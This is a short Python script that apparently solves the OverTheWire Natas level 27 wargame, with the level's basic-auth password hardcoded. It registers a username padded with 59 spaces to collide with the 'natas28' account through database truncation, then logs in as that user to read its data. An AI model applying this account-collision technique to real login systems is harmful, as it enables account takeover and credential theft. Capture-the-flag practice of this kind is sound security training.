import requests as req

username = "natas27"
password = "55TBjpPZUUJgVP5b3BnbG6ON9uDPVzCJ"
url = "http://natas27.natas.labs.overthewire.org"

session = req.Session()

response = session.post(url, data=\
    {"username": "natas28"+" "*59+"muahaha",
    "password": " "}, auth=(username, password))

response = session.post(url, data=\
    {"username": "natas28",
    "password": " "}, auth=(username, password))
print(response.text)
